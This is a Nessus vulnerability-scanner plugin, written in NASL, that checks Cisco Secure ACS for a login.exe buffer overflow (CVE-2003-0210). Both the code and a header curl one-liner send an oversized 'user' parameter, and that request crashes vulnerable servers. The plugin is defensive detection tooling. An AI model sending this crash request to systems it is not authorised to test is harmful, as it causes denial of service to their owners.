#
# This script was written by Xue Yong Zhi <xueyong@udel.edu>
#
# See the Nessus Scripts License for details
#
# References:
# NSFOCUS SA2003-04
# curl -i "http://host:2002/login.exe?user=`perl -e "print ('a'x400)"`&reply=any&id=1"
########################

if(description)
{
 script_id(11556);
 script_bugtraq_id(7413);
 script_version ("$Revision: 1.6 $");
 script_cve_id("CVE-2003-0210");
 
 name["english"] = "CISCO Secure ACS Management Interface Login Overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
It may be possible to make this Cisco Secure ACS web
server(login.exe) execute arbitrary code by sending
it a too long login url. 

Risk factor : High

Solution : Cisco has already released a patch for this problem";


 script_description(english:desc["english"]);
 
 summary["english"] = "CISCO Secure ACS Management Interface Login Overflow";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK); 
 
 script_copyright(english:"This script is Copyright (C) 2003 Xue Yong Zhi");
 family["english"] = "CISCO";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www",2002);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

ports = add_port_in_list(list:get_kb_list("Services/www"), port:2002);
foreach port (ports)
{
 if(http_is_dead(port:port) == 0 )
 {
 if(is_cgi_installed_ka(port:port, item:"/login.exe"))
  {
  req = string("/login.exe?user=", crap(400), "&reply=any&id=1");
  req = http_get(item:req, port:port);
  http_keepalive_send_recv(port:port, data:req);

  #The request will make a vunerable server suspend until a restart
  if(http_is_dead(port:port)) {
	security_hole(port);
	exit(0);
	}
  }
 }
}
